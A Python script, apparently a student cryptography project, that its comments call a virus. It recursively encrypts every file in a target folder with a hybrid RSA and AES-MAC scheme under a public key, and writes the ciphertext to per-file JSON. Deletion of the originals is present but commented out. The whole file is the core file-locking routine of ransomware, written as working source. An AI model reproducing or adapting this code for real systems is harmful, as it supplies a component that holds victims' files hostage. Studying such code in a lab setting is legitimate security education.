# Import methods from other files 
from fileEncryptMAC import MyencryptMAC, MydecryptMAC, MyFileEncryptMAC, MyFileDecryptMAC
from fileEncryptRSA import generateKeyPair, MyRSAencrypt, MyRSAdecrypt
# Import needed cryptogrpahy 
import os
import json, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.asymmetric.padding import MGF1 as uno
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_ssh_public_key
from pathlib import Path #used to get file ext

'''
Making a VIRUS that infect and encrypt a certain folder
'''

# This is the file where the virus will infect
# Making this path(tester folder) the current working directory 
dir_path = '/Users/Phuc Nguyen/Desktop/Testing'
pub_key = "/Users/Phuc Nguyen/Desktop/FinalTesting/SHREKISLOVESHREKISLIFE555/publicKey.pem"
#os.chdir(dir_path)
#cwd = os.getcwd()
#print("Current directory:" + cwd)

def infection():
    jason={}

    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            print("Encrypting " + filename + "...")
            # change directory to root in order to start from root and acess every folder inside the path
            #os.chdir(root)
            # join the path of file with root to loop through every folder 
            path=os.path.join(root,filename) 
            # Encryption method 
            RSACipher, C, IV, ext, tag = MyRSAencrypt(path, pub_key )
            # getting rid of the extension (.jpg, ..)
            fname = path.replace(ext,'')
        
            # Encoding using base 64 and decode with ascii and store it in a dictionary to dump it and write into ecrypted file 
            data = {'RSACipher':base64.b64encode(RSACipher).decode('ascii'),
                      'C':base64.b64encode(C).decode('ascii'),
                      'IV':base64.b64encode(IV).decode('ascii'),
                      'tag':base64.b64encode(tag).decode('ascii'),
                      'ext':ext } #make dict for json
            
            # adding the extension as .json file 
            jsonFile = fname + ".json"
            
            # writing the data to encrypted file 
            with open(jsonFile, 'w') as outfile: #Writes to json 
                outfile.write(json.dumps(data)) # write the dumped dictionary to file 
                outfile.close()
            #os.remove(filename) # remove all the file after encrypting it 

# testing
infection()
